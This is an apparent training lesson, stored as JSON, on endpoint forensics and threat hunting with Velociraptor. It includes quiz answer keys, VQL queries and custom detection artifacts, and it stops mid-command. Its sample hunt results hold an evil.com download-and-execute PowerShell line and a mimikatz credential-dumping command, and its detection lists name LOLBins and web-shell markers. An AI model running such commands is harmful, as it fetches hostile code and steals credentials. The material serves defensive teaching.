{
  "lesson_id": "a8f3c4d2-9b7e-4a1c-8d6f-2e5a9c1b3f7d",
  "domain": "dfir",
  "title": "Velociraptor: Advanced Endpoint Forensics and Hunting",
  "difficulty": 2,
  "order_index": 9,
  "prerequisites": [
    "d4e7f2a1-3c8b-4f9d-7e2a-5b1c9d6f3a8e"
  ],
  "concepts": [
    "Velociraptor architecture and deployment",
    "VQL (Velociraptor Query Language)",
    "Artifact collection and analysis",
    "Remote forensic triage",
    "Endpoint detection and hunting",
    "Timeline reconstruction",
    "Memory analysis with Velociraptor",
    "Incident response automation",
    "Threat hunting at scale"
  ],
  "estimated_time": 45,
  "learning_objectives": [
    "Understand Velociraptor's architecture and deployment models",
    "Master VQL syntax for custom artifact collection",
    "Perform remote forensic triage across multiple endpoints",
    "Build custom hunting artifacts for threat detection",
    "Analyze collected artifacts for IOCs and TTPs",
    "Automate incident response workflows",
    "Scale forensic investigations across enterprise environments"
  ],
  "post_assessment": [
    {
      "question": "What is the primary query language used in Velociraptor for artifact collection?",
      "options": [
        "SQL",
        "VQL",
        "KQL",
        "SPL"
      ],
      "correct_answer": 1,
      "explanation": "VQL (Velociraptor Query Language) is the domain-specific language used to define artifacts and queries in Velociraptor. It's similar to SQL but designed specifically for endpoint forensics.",
      "difficulty": 1,
      "topic": "velociraptor_basics",
      "subtopic": "vql",
      "question_id": "8f7c7a5f-c8b9-4543-aab5-4c5cd9503e70",
      "type": "multiple_choice"
    },
    {
      "question": "In Velociraptor, what is an 'artifact'?",
      "options": [
        "A malicious file found on an endpoint",
        "A packaged VQL query that collects specific forensic data",
        "A compressed log file",
        "A memory dump"
      ],
      "correct_answer": 1,
      "explanation": "An artifact in Velociraptor is a YAML-defined package containing VQL queries that collect specific types of forensic data (e.g., Windows.System.Processes, Windows.EventLogs.RDPAuth).",
      "difficulty": 1,
      "topic": "velociraptor_basics",
      "subtopic": "artifacts",
      "question_id": "5f545954-951f-4f67-b88f-4078eac9ae2f",
      "type": "multiple_choice"
    },
    {
      "question": "Which Velociraptor artifact would you use to hunt for process injection techniques?",
      "options": [
        "Windows.System.Pslist",
        "Windows.Detection.ProcessInjection",
        "Windows.Memory.Analysis",
        "Windows.Network.NetstatEnriched"
      ],
      "correct_answer": 1,
      "explanation": "Windows.Detection.ProcessInjection specifically looks for indicators of process injection techniques like hollowing, APC injection, and reflective DLL loading.",
      "difficulty": 2,
      "topic": "threat_hunting",
      "subtopic": "process_injection",
      "question_id": "41dbbe4e-88d2-41fa-9549-2b58ec7b9131",
      "type": "multiple_choice"
    },
    {
      "question": "What is the advantage of Velociraptor's 'offline collector' mode?",
      "options": [
        "It requires no network connectivity",
        "It collects artifacts from powered-off machines",
        "It analyzes data without installing agents",
        "It works on air-gapped networks"
      ],
      "correct_answer": 3,
      "explanation": "Velociraptor's offline collector allows forensic triage on air-gapped or isolated networks by creating a standalone executable with embedded artifacts that doesn't require server connectivity.",
      "difficulty": 2,
      "topic": "deployment",
      "subtopic": "offline_mode",
      "question_id": "109c28c8-b992-455c-9d5c-b62b43a6d23a",
      "type": "multiple_choice"
    },
    {
      "question": "In VQL, what does the 'LET' keyword do?",
      "options": [
        "Limits query results",
        "Defines a variable or stored query",
        "Lists event logs",
        "Loads external data"
      ],
      "correct_answer": 1,
      "explanation": "LET defines variables or stored queries in VQL that can be reused later in the artifact, similar to SQL's WITH clause or CTE (Common Table Expression).",
      "difficulty": 2,
      "topic": "vql",
      "subtopic": "syntax",
      "question_id": "11fdde33-dcb7-4df7-97d5-419ebfbdec2d",
      "type": "multiple_choice"
    },
    {
      "question": "Which artifact provides Windows Event Log hunting across multiple machines?",
      "options": [
        "Windows.EventLogs.Evtx",
        "Windows.EventLogs.EvtxHunter",
        "Windows.System.EventLogs",
        "Windows.Detection.EventHunting"
      ],
      "correct_answer": 1,
      "explanation": "Windows.EventLogs.EvtxHunter allows searching for specific Event IDs or patterns across event logs on multiple endpoints simultaneously.",
      "difficulty": 2,
      "topic": "artifacts",
      "subtopic": "event_logs",
      "question_id": "87a39507-a3f8-46a0-8a0b-b02fdac31323",
      "type": "multiple_choice"
    },
    {
      "question": "What forensic advantage does Velociraptor have over traditional EDR tools?",
      "options": [
        "It prevents malware execution",
        "It provides granular artifact customization and VQL queries",
        "It automatically blocks threats",
        "It requires no agent installation"
      ],
      "correct_answer": 1,
      "explanation": "Unlike black-box EDR tools, Velociraptor allows analysts to write custom VQL queries and artifacts for specific investigations, providing complete visibility and control over data collection.",
      "difficulty": 3,
      "topic": "velociraptor_concepts",
      "subtopic": "advantages",
      "question_id": "0ed2551d-95a7-4bff-a5bb-61a55fccc63e",
      "type": "multiple_choice"
    },
    {
      "question": "How would you hunt for LOLBins abuse using Velociraptor?",
      "options": [
        "Monitor Windows.System.Pslist for LOLBin processes",
        "Use Windows.Detection.Lolbins artifact with command-line analysis",
        "Search Windows.Registry.NTUser for LOLBin keys",
        "Analyze Windows.Network.NetFlow for LOLBin traffic"
      ],
      "correct_answer": 1,
      "explanation": "Windows.Detection.Lolbins artifact analyzes process command lines for suspicious use of living-off-the-land binaries (certutil, regsvr32, mshta, etc.) often abused by attackers.",
      "difficulty": 3,
      "topic": "threat_hunting",
      "subtopic": "lolbins",
      "question_id": "7f7686bd-95c7-4d08-8df7-43bd4ea83750",
      "type": "multiple_choice"
    },
    {
      "question": "In Velociraptor, what is a 'hunt'?",
      "options": [
        "A scheduled artifact collection",
        "An investigation targeting multiple endpoints simultaneously",
        "A search for specific file hashes",
        "A memory analysis operation"
      ],
      "correct_answer": 1,
      "explanation": "A hunt in Velociraptor is an operation that executes an artifact collection across multiple endpoints (or an entire organization) simultaneously, enabling scale forensics.",
      "difficulty": 1,
      "topic": "operations",
      "subtopic": "hunts",
      "question_id": "bf7d92c8-072d-452a-881c-72a51d40fba3",
      "type": "multiple_choice"
    },
    {
      "question": "What is the purpose of Velociraptor's 'notebook' feature?",
      "options": [
        "To document investigation procedures",
        "To provide Jupyter-style analysis with VQL cells and visualizations",
        "To store collected artifacts",
        "To schedule automated hunts"
      ],
      "correct_answer": 1,
      "explanation": "Notebooks in Velociraptor provide Jupyter-style interactive analysis where analysts can write VQL queries in cells, visualize results, and document findings collaboratively.",
      "difficulty": 2,
      "topic": "analysis",
      "subtopic": "notebooks",
      "question_id": "f4096415-827c-4a53-8f69-078fcbd537ad",
      "type": "multiple_choice"
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Velociraptor Mastery!\n\nImagine having the power to instantly investigate ANY endpoint in your organization. Need to check 10,000 machines for a specific malware artifact? Done in minutes. Want to hunt for LOLBins abuse across your entire enterprise? A few clicks away.\n\n**Velociraptor is a game-changer for digital forensics and incident response.** Created by Mike Cohen (former Google security engineer), it's an open-source endpoint visibility tool that combines the flexibility of DFIR frameworks with the scale of EDR platforms.\n\nUnlike traditional EDR tools that are 'black boxes,' Velociraptor gives you complete control through VQL (Velociraptor Query Language) - allowing you to craft custom queries for ANY forensic artifact you can imagine.\n\n## Why Velociraptor Matters\n\n**Real-World Impact:**\n- **CrowdStrike Incident (2024)**: When the infamous CrowdStrike Falcon update caused worldwide system crashes, many organizations used Velociraptor to rapidly assess impact across thousands of endpoints without waiting for traditional forensic tools.\n- **SolarWinds Response (2020)**: IR teams used Velociraptor to hunt for SUNBURST indicators across entire enterprises in hours instead of weeks.\n- **Ransomware Outbreaks**: Security teams use Velociraptor to instantly identify patient zero and all compromised systems during ransomware incidents.\n\n## What Makes Velociraptor Unique?\n\n1. **Agentless Flexibility**: Deploy agents OR use offline collectors for air-gapped networks\n2. **VQL Power**: Write custom forensic queries in a SQL-like language\n3. **Scale**: Investigate 10,000+ endpoints simultaneously\n4. **Artifact Library**: 400+ pre-built forensic artifacts (registry, memory, network, files)\n5. **Open Source**: Free, transparent, community-driven\n6. **Live Forensics**: Real-time endpoint visibility without disrupting operations\n\nYou're about to learn a tool used by Fortune 500 companies, government agencies, and elite IR teams worldwide. Let's dive in!"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Velociraptor: Advanced Endpoint Forensics and Hunting Overview",
        "url": "https://www.youtube.com/embed/Vh_h6NfLkAg",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**🧠 Learning Mindset: From Intimidation to Innovation**\n\nI know what you're thinking: 'Another tool to learn? Another query language?'\n\nHere's the truth: **Velociraptor will change how you think about forensics forever.**\n\nThink of VQL like learning to drive a manual transmission car. At first, it feels complicated (clutch, gear shifts, coordination). But once you master it, you have TOTAL control that automatic transmissions can't match.\n\n**Jim Kwik's Active Learning Principle**: You won't master Velociraptor by reading alone. You'll master it by:\n- Writing VQL queries (even simple ones)\n- Breaking artifacts and fixing them\n- Hunting for real IOCs in lab environments\n- Teaching others what you've learned\n\n**Your Challenge**: By the end of this lesson, write ONE custom VQL query. Just one. That's your proof of active learning.\n\nRemember: Every expert was once a beginner who refused to quit. Let's go!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Velociraptor Architecture: Understanding the Ecosystem\n\n## Core Components\n\nVelociraptor follows a client-server architecture:\n\n```\n┌─────────────────────────────────────────────────────┐\n│                 Velociraptor Server                 │\n│  ┌──────────────┐  ┌──────────────┐  ┌──────────┐ │\n│  │  Frontend    │  │   Datastore  │  │   API    │ │\n│  │ (Web GUI)    │  │  (FileStore) │  │ (gRPC)   │ │\n│  └──────────────┘  └──────────────┘  └──────────┘ │\n└─────────────────────────────────────────────────────┘\n│\n│ TLS Encrypted\n│ Communications\n│\n┌────────────────┼────────────────┐\n│                │                │\n┌───────▼──────┐  ┌──────▼──────┐  ┌─────▼────────┐\n│  Endpoint 1  │  │ Endpoint 2  │  │ Endpoint N   │\n│  (Agent)     │  │ (Agent)     │  │ (Agent)      │\n└──────────────┘  └─────────────┘  └──────────────┘\n```bash\n\n### 1. Velociraptor Server\n\n**Responsibilities:**\n- Hosts the web-based GUI (default port 8889)\n- Stores collected artifacts in the FileStore\n- Manages client communications via gRPC\n- Schedules and coordinates hunts\n- Provides API for automation\n\n**Key Features:**\n- Multi-tenancy support (multiple organizations)\n- Role-based access control (RBAC)\n- Audit logging for compliance\n- Notebook collaboration\n\n### 2. Velociraptor Client (Agent)\n\n**Responsibilities:**\n- Lightweight agent (~10MB executable)\n- Executes VQL queries locally on endpoints\n- Collects forensic artifacts\n- Streams results back to server\n- Minimal resource footprint (~20-50MB RAM)\n\n**Communication:**\n- TLS-encrypted gRPC connections\n- Certificate-based mutual authentication\n- Configurable check-in intervals (default: 10s)\n- Works through proxies and NAT\n\n### 3. Offline Collector\n\n**Use Cases:**\n- Air-gapped networks (no internet)\n- Incident response triage (USB deployment)\n- Compliance audits (point-in-time collection)\n- Evidence collection for legal cases\n\n**How It Works:**\n- Standalone executable with embedded artifacts\n- No server required\n- Creates ZIP file with results\n- Can be imported into server later for analysis\n\n## Deployment Models\n\n### Model 1: Enterprise Server-Client\n- **Scale**: 10,000+ endpoints\n- **Use Case**: Continuous monitoring, threat hunting\n- **Example**: SOC team hunting across corporate network\n\n### Model 2: Incident Response Portable\n- **Scale**: 1-100 endpoints\n- **Use Case**: Rapid IR triage\n- **Example**: USB stick with Velociraptor server + collectors\n\n### Model 3: Offline Collectors\n- **Scale**: Individual systems\n- **Use Case**: Air-gapped forensics, evidence collection\n- **Example**: Forensic triage of isolated OT/ICS systems"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Installing Velociraptor: Quick Start\n\n## Step 1: Download Velociraptor\n\n```bash\n# Linux/Mac\nwget https://github.com/Velocidex/velociraptor/releases/latest/download/velociraptor-linux-amd64\nchmod +x velociraptor-linux-amd64\n\n# Windows (PowerShell)\nInvoke-WebRequest -Uri \"https://github.com/Velocidex/velociraptor/releases/latest/download/velociraptor-windows-amd64.exe\" -OutFile \"velociraptor.exe\"\n```bash\n\n## Step 2: Generate Server Configuration\n\n```bash\n# Generate server config (interactive wizard)\n./velociraptor-linux-amd64 config generate -i\n\n# Outputs:\n# - server.config.yaml (server configuration)\n# - client.config.yaml (client configuration)\n```\n\n**Key Configuration Options:**\n- **Datastore Path**: Where artifacts are stored (default: /opt/velociraptor)\n- **Frontend Bind**: Web GUI address (default: 0.0.0.0:8889)\n- **GUI Users**: Admin username/password\n- **Client Bind**: gRPC endpoint for agents\n\n## Step 3: Start the Server\n\n```bash\n# Run server (foreground)\n./velociraptor-linux-amd64 --config server.config.yaml frontend -v\n\n# Run as systemd service (recommended for production)\nsudo ./velociraptor-linux-amd64 --config server.config.yaml service install\nsudo systemctl start velociraptor_server\nsudo systemctl enable velociraptor_server\n```bash\n\n## Step 4: Deploy Agents\n\n### Option A: MSI Installer (Windows)\n\n```bash\n# Repack client config into MSI installer\n./velociraptor-linux-amd64 --config server.config.yaml config repack client.config.yaml velociraptor-client.msi\n\n# Deploy via GPO, SCCM, or manual installation\n```bash\n\n### Option B: Linux Package\n\n```bash\n# Create DEB package\n./velociraptor-linux-amd64 --config server.config.yaml debian client --binary velociraptor-linux-amd64\n\n# Install on endpoints\nsudo dpkg -i velociraptor-client.deb\nsudo systemctl start velociraptor_client\n```bash\n\n### Option C: Offline Collector (No Agent)\n\n```bash\n# Create standalone collector with specific artifacts\n./velociraptor-linux-amd64 --config server.config.yaml collector create \\\n--artifacts Windows.KapeFiles.Targets \\\n--artifacts Windows.System.Pslist \\\n--output collector.exe\n\n# Run collector on target (creates ZIP output)\n./collector.exe\n```bash\n\n## Step 5: Access Web GUI\n\n1. Open browser: `https://localhost:8889`\n2. Login with credentials from config generation\n3. Accept self-signed certificate (or configure proper TLS)\n\n**First Steps in GUI:**\n- Navigate to **Show All Clients** to see connected agents\n- Go to **Artifacts** to browse the artifact library\n- Create your first **Hunt** to collect data at scale"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# VQL: The Heart of Velociraptor\n\n## What is VQL?\n\n**VQL (Velociraptor Query Language)** is a SQL-like query language designed specifically for digital forensics and incident response. It's the engine that powers all artifact collection in Velociraptor.\n\n**Think of VQL as:**\n- SQL for forensics (familiar syntax)\n- Python for flexibility (plugins, functions, loops)\n- PowerShell for Windows integration (WMI, registry, event logs)\n\n## VQL Syntax Basics\n\n### Simple SELECT Statement\n\n```sql\n-- List all running processes\nSELECT Pid, Name, CommandLine, Exe\nFROM pslist()\nWHERE Name =~ 'powershell'\n```\n\n**Breakdown:**\n- `SELECT`: Columns to retrieve\n- `FROM pslist()`: Plugin that lists processes (like a table)\n- `WHERE`: Filter condition\n- `=~`: Regex match operator\n\n### VQL Operators\n\n```sql\n-- Comparison\nWHERE Pid = 1234\nWHERE Name = 'svchost.exe'\n\n-- Regex matching\nWHERE Name =~ 'cmd|powershell|wscript'\nWHERE CommandLine =~ 'Invoke-Mimikatz'\n\n-- Logical operators\nWHERE (Name = 'powershell.exe') AND (CommandLine =~ '-enc')\nWHERE Pid > 1000 OR Ppid = 4\n\n-- IN operator\nWHERE Name IN ('cmd.exe', 'powershell.exe', 'wscript.exe')\n```bash\n\n### Variables with LET\n\n```sql\n-- Define suspicious processes list\nLET SuspiciousProcesses = ('powershell.exe', 'cmd.exe', 'wscript.exe', 'mshta.exe')\n\n-- Use variable in query\nSELECT Pid, Name, CommandLine\nFROM pslist()\nWHERE Name IN SuspiciousProcesses\nAND CommandLine =~ 'http://'\n```bash\n\n## VQL Plugins\n\nPlugins are the data sources in VQL (think of them as SQL tables):\n\n### Process Plugins\n\n```sql\n-- pslist(): Running processes (similar to ps/tasklist)\nSELECT * FROM pslist()\n\n-- proc_yara(): Scan process memory with YARA rules\nSELECT Pid, Name, Rule, Strings\nFROM proc_yara(rules='rule Mimikatz { strings: $a=\"sekurlsa::logonpasswords\" condition: $a }')\n```bash\n\n### File System Plugins\n\n```sql\n-- glob(): Find files by pattern (recursive)\nSELECT FullPath, Size, Mtime\nFROM glob(globs='C:/Users/*/AppData/**/*.exe')\nWHERE Size < 100000  -- Small executables (potential malware)\n\n-- parse_mft(): Parse NTFS Master File Table\nSELECT FileName, ParentPath, Created0x10, Modified0x10\nFROM parse_mft(filename='C:/$MFT')\nWHERE FileName =~ '\\.exe$' AND Created0x10 > '2024-10-01'\n```bash\n\n### Registry Plugins (Windows)\n\n```sql\n-- read_reg_key(): Read registry keys\nSELECT Key, Name, Data\nFROM read_reg_key(globs='HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/*')\n\n-- reg_query(): Search registry for patterns\nSELECT Key, Name, Data\nFROM reg_query(key='HKEY_CURRENT_USER/Software/**')\nWHERE Data =~ 'powershell.*-enc'\n```bash\n\n### Event Log Plugins (Windows)\n\n```sql\n-- watch_evtx(): Monitor event logs in real-time\nSELECT System.TimeCreated.SystemTime AS EventTime,\nSystem.EventID.Value AS EventID,\nEventData.TargetUserName AS User,\nEventData.IpAddress AS IP\nFROM watch_evtx(filename='C:/Windows/System32/winevt/logs/Security.evtx')\nWHERE System.EventID.Value = 4624  -- Successful logon\n```bash\n\n### Network Plugins\n\n```sql\n-- netstat(): Active network connections\nSELECT Laddr.IP AS LocalIP,\nLaddr.Port AS LocalPort,\nRaddr.IP AS RemoteIP,\nRaddr.Port AS RemotePort,\nStatus, Pid\nFROM netstat()\nWHERE Status = 'ESTABLISHED'\nAND Raddr.IP =~ '^(?!10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.).*'  -- External IPs only\n```bash\n\n## Common VQL Patterns\n\n### Pattern 1: Hunt for LOLBins Abuse\n\n```sql\nLET LOLBins = ('certutil.exe', 'bitsadmin.exe', 'regsvr32.exe', 'mshta.exe', 'rundll32.exe')\n\nSELECT Pid, Name, CommandLine, Ppid, Username\nFROM pslist()\nWHERE Name IN LOLBins\nAND (CommandLine =~ 'http://' OR CommandLine =~ 'https://' OR CommandLine =~ '-decode')\n```bash\n\n### Pattern 2: Detect Process Injection\n\n```sql\nSELECT Pid, Name, Exe,\nMemoryInfo.WorkingSetSize AS Memory,\nMemoryInfo.VirtualSize AS Virtual\nFROM pslist()\nWHERE (Virtual - Memory) > 100000000  -- Large virtual memory without matching working set (possible injection)\n```bash\n\n### Pattern 3: Timeline Recent File Modifications\n\n```sql\nSELECT FullPath, Size,\ntimestamp(epoch=Mtime) AS ModifiedTime,\ntimestamp(epoch=Ctime) AS CreatedTime\nFROM glob(globs='C:/Users/**/*')\nWHERE Mtime > now() - 86400  -- Last 24 hours\nORDER BY ModifiedTime DESC\nLIMIT 1000\n```"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# 🧠 VQL Memory Aids\n\n## The VQL Formula: **S-F-W-O**\n\n**S**ELECT what you want\n**F**ROM where it lives (plugin)\n**W**HERE filter it down\n**O**RDER and limit results\n\n**Example Mnemonic**: \"**S**uper **F**orensic **W**izards **O**rganize data\"\n\n## The Plugin Categories: **PRFEN**\n\n- **P**rocesses: `pslist()`, `proc_yara()`\n- **R**egistry: `read_reg_key()`, `reg_query()`\n- **F**iles: `glob()`, `parse_mft()`\n- **E**vents: `watch_evtx()`, `parse_evtx()`\n- **N**etwork: `netstat()`, `dns_resolve()`\n\n**Mnemonic**: \"**PR**o **F**orensics **E**xperts **N**eed these plugins\"\n\n## Regex Operator: **Squiggly Equals = ~**\n\n`=~` means \"matches regex pattern\"\n\n**Memory Trick**: The squiggly line (~) represents a wave, and regex patterns are like waves of characters.\n\n**Example**:\n```sql\nWHERE Name =~ 'powershell|cmd|wscript'  -- Matches any of these\n```bash\n\n## LET Variables: **Define Before Use**\n\nThink of LET as \"**L**abel **E**verything **T**emporarily\"\n\n```sql\nLET SuspiciousIPs = ('192.168.1.100', '10.0.0.50')\nLET TimeWindow = now() - 3600  -- 1 hour ago\n\nSELECT * FROM netstat()\nWHERE Raddr.IP IN SuspiciousIPs\nAND Timestamp > TimeWindow\n```bash\n\n## The Golden Rule of Artifacts\n\n**Every artifact is just VQL wrapped in YAML**\n\nIf you can write VQL, you can create custom artifacts. Think of artifacts as reusable VQL recipes."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Velociraptor Artifacts: Pre-Built Forensic Recipes\n\n## What Are Artifacts?\n\nArtifacts are **packaged VQL queries** defined in YAML format that collect specific forensic data. They're like Ansible playbooks or Docker containers - portable, reusable, shareable.\n\n**Artifact Structure:**\n\n```yaml\nname: Custom.Windows.Suspicious.Processes\ndescription: |\nHunt for suspicious process patterns indicating compromise.\nauthor: Your Name\ntype: CLIENT\n\nparameters:\n- name: ProcessNameRegex\ndefault: 'powershell|cmd|wscript'\ndescription: Regex pattern for suspicious process names\n\nsources:\n- query: |\nSELECT Pid, Name, CommandLine, Ppid, Username,\ntimestamp(epoch=CreateTime) AS StartTime\nFROM pslist()\nWHERE Name =~ ProcessNameRegex\nAND CommandLine =~ 'http://|https://|-enc|-encoded'\n```\n\n**Artifact Types:**\n\n1. **CLIENT**: Runs on endpoints (most common)\n2. **SERVER**: Runs on Velociraptor server\n3. **CLIENT_EVENT**: Continuous monitoring (event-driven)\n4. **SERVER_EVENT**: Server-side monitoring\n\n## Built-in Artifact Library\n\nVelociraptor ships with **400+ pre-built artifacts** covering:\n\n### Category 1: Windows Forensics\n\n```\nWindows.System.Pslist               - Running processes\nWindows.System.Services             - Windows services\nWindows.Registry.NTUser             - User registry hives\nWindows.EventLogs.EvtxHunter        - Event log hunting\nWindows.Network.NetstatEnriched     - Network connections with process info\nWindows.Forensics.Usn               - USN journal (file changes)\nWindows.Forensics.Timeline          - Super timeline (MFT + logs + registry)\nWindows.Memory.Acquisition          - Memory dump collection\nWindows.Sysinternals.Autoruns       - Persistence locations (Sysinternals Autoruns)\n```bash\n\n### Category 2: Detection & Hunting\n\n```\nWindows.Detection.ProcessInjection  - Process injection indicators\nWindows.Detection.Lolbins           - LOLBins abuse detection\nWindows.Detection.Webshells         - Webshell hunting\nWindows.Detection.Yara              - YARA scanning (files/memory)\nWindows.Detection.Malfind           - Suspicious memory regions\nWindows.Lateral.RDP                 - RDP lateral movement\nWindows.Lateral.PsExec              - PsExec usage detection\n```bash\n\n### Category 3: Linux Forensics\n\n```\nLinux.Sys.Pslist                    - Running processes\nLinux.Sys.LastUserLogin             - User login history\nLinux.Sys.Crontab                   - Scheduled tasks\nLinux.Sys.BashHistory               - Bash command history\nLinux.Sys.DockerInfo                - Docker container info\nLinux.Network.Netstat               - Network connections\n```bash\n\n### Category 4: Collection & Triage\n\n```\nWindows.KapeFiles.Targets           - KAPE target collection\nWindows.Collectors.File             - Specific file collection\nWindows.System.RegistryHives        - Registry hive export\nGeneric.Forensics.SQLiteHunter      - SQLite database hunting\n```bash\n\n## Using Artifacts: Practical Examples\n\n### Example 1: Hunt for Kerberoasting\n\n**Artifact**: `Windows.EventLogs.Kerberoast`\n\n```yaml\nname: Windows.EventLogs.Kerberoast\ndescription: |\nDetects potential Kerberoasting attacks by monitoring Event ID 4769\n(TGS requests) for suspicious patterns.\n\nsources:\n- query: |\nSELECT System.TimeCreated.SystemTime AS EventTime,\nEventData.ServiceName AS ServiceName,\nEventData.TargetUserName AS User,\nEventData.IpAddress AS SourceIP,\nEventData.TicketEncryptionType AS EncType\nFROM watch_evtx(filename='C:/Windows/System32/winevt/logs/Security.evtx')\nWHERE System.EventID.Value = 4769\nAND EventData.ServiceName =~ '^[^$]+$'  -- Not machine account\nAND EventData.TicketEncryptionType = '0x17'  -- RC4 (weak encryption)\n```bash\n\n### Example 2: Memory-Resident Malware Detection\n\n**Artifact**: `Windows.Detection.Malfind`\n\n```yaml\nname: Windows.Detection.Malfind\ndescription: |\nIdentifies suspicious memory regions (RWX permissions, private memory)\nthat may indicate process injection or memory-resident malware.\n\nsources:\n- query: |\nLET processes = SELECT Pid, Name FROM pslist()\n\nSELECT Pid, Name, Address, Size, Protection, Type\nFROM foreach(\nrow=processes,\nquery={\nSELECT Pid, Name,\nformat(format='0x%x', args=Address) AS Address,\nSize, Protection, Type\nFROM vad(pid=Pid)\nWHERE Protection =~ 'xrw'  -- Execute + Read + Write\nAND Type =~ 'Private'    -- Not mapped to file\nAND Size > 100000        -- Larger than 100KB\n}\n)\n```bash\n\n### Example 3: Web Shell Hunting\n\n**Artifact**: `Windows.Detection.Webshells`\n\n```yaml\nname: Windows.Detection.Webshells\ndescription: |\nHunts for web shells in common web directories (IIS, Apache).\n\nparameters:\n- name: WebRoots\ndefault: |\nC:/inetpub/wwwroot/**\nC:/Program Files/Apache*/htdocs/**\nC:/xampp/htdocs/**\n\nsources:\n- query: |\nLET webshell_indicators = ('eval(', 'base64_decode', 'cmd.exe', 'powershell', 'System.Diagnostics')\n\nSELECT FullPath, Size,\ntimestamp(epoch=Mtime) AS Modified,\nupload(file=FullPath) AS Upload\nFROM glob(globs=split(string=WebRoots, sep='\\n'))\nWHERE FullPath =~ '\\.(aspx|php|jsp|asp)$'\nAND regex_replace(source=utf16(string=read_file(filename=FullPath)), re='\\s+', replace='') =~ join(array=webshell_indicators, sep='|')\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Creating Your First Custom Artifact\n\n## Scenario: Hunt for Suspicious PowerShell Execution\n\nYou're investigating a ransomware incident. Intelligence suggests attackers used encoded PowerShell commands. Let's create an artifact to hunt for this activity.\n\n## Step 1: Define the Artifact\n\nCreate file: `Custom.Windows.PowerShellHunting.yaml`\n\n```yaml\nname: Custom.Windows.PowerShellHunting\ndescription: |\nDetects suspicious PowerShell execution patterns:\n- Encoded commands (-enc, -EncodedCommand)\n- Download cradles (IEX, DownloadString, WebClient)\n- Obfuscation (backticks, string concatenation)\n- Execution policy bypass\n\nauthor: Your Name\ntype: CLIENT\n\nparameters:\n- name: LookbackDays\ndefault: 7\ntype: int\ndescription: How many days to look back for process events\n\n- name: IncludeHistory\ndefault: Y\ntype: bool\ndescription: Include PowerShell command history files\n\nsources:\n- name: SuspiciousProcesses\nquery: |\nLET SuspiciousPatterns = '''-enc|-encodedcommand|-ep\\s+bypass|downloadstring|invoke-expression|iex\\s*\\(|webclient'''\n\nSELECT Pid, Ppid, Name, CommandLine,\nUsername,\ntimestamp(epoch=CreateTime) AS ProcessStartTime\nFROM pslist()\nWHERE Name =~ 'powershell'\nAND lowcase(string=CommandLine) =~ SuspiciousPatterns\n\n- name: RecentScriptBlockLogs\nquery: |\nLET TimeWindow = now() - (LookbackDays * 86400)\n\nSELECT System.TimeCreated.SystemTime AS EventTime,\nEventData.ScriptBlockText AS ScriptContent,\nEventData.Path AS ScriptPath\nFROM parse_evtx(filename='C:/Windows/System32/winevt/logs/Microsoft-Windows-PowerShell%4Operational.evtx')\nWHERE System.EventID.Value = 4104  -- Script Block Logging\nAND System.TimeCreated.SystemTime > TimeWindow\nAND lowcase(string=EventData.ScriptBlockText) =~ SuspiciousPatterns\nLIMIT 500\n\n- name: PowerShellHistory\nquery: |\nLET HistoryPaths = 'C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'\n\nSELECT FullPath AS HistoryFile,\nparse_lines(filename=FullPath) AS Commands\nFROM glob(globs=HistoryPaths)\nWHERE IncludeHistory = 'Y'\n```bash\n\n## Step 2: Import the Artifact\n\n### Option A: Via Web GUI\n\n1. Navigate to **View Artifacts** → **Add Artifact**\n2. Paste the YAML content\n3. Click **Save**\n\n### Option B: Via Command Line\n\n```bash\n# Add artifact to server\nvelociraptor --config server.config.yaml artifacts import Custom.Windows.PowerShellHunting.yaml\n```bash\n\n## Step 3: Test on a Single Endpoint\n\n1. Go to **Show All Clients**\n2. Select a test endpoint\n3. Click **Collect New Artifact**\n4. Search for \"Custom.Windows.PowerShellHunting\"\n5. Configure parameters:\n- LookbackDays: `7`\n- IncludeHistory: `Y`\n6. Click **Launch**\n\n## Step 4: Review Results\n\nNavigate to the collection and review each source:\n\n**SuspiciousProcesses Source:**\n```\nPid: 3456\nName: powershell.exe\nCommandLine: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...\nUsername: CORP\\john.doe\nProcessStartTime: 2024-10-25T14:32:18Z\n```\n\n**RecentScriptBlockLogs Source:**\n```\nEventTime: 2024-10-25T14:32:20Z\nScriptContent: $client = New-Object Net.WebClient; $client.DownloadString('http://evil.com/payload.ps1') | IEX\nScriptPath: -\n```\n\n**PowerShellHistory Source:**\n```\nHistoryFile: C:/Users/john.doe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt\nCommands: [\n\"wget http://evil.com/mimikatz.exe -OutFile C:\\\\temp\\\\m.exe\",\n\"C:\\\\temp\\\\m.exe privilege::debug sekurlsa::logonpasswords\"\n]\n```bash\n\n## Step 5: Launch a Hunt (Organization-Wide)\n\nOnce tested, deploy across your environment:\n\n1. Navigate to **Hunts** → **New Hunt**\n2. Select artifact: `Custom.Windows.PowerShellHunting`\n3. Configure:\n- **Hunt Description**: \"Ransomware IR - PowerShell IOC Hunt\"\n- **Target**: All Windows endpoints\n- **Parameters**: Keep defaults\n4. Click **Launch Hunt**\n\n**Expected Results:**\n- 10,000 endpoints scanned in ~15 minutes\n- Results viewable in real-time\n- Suspicious findings automatically flagged\n\n## Bonus: Export Results for Analysis\n\n```bash\n# Export hunt results to JSON\nvelociraptor --config server.config.yaml hunts export --hunt_id H.1234 --format json > powershell_hunt_results.json\n\n# Process with jq\ncat powershell_hunt_results.json | jq '.[] | 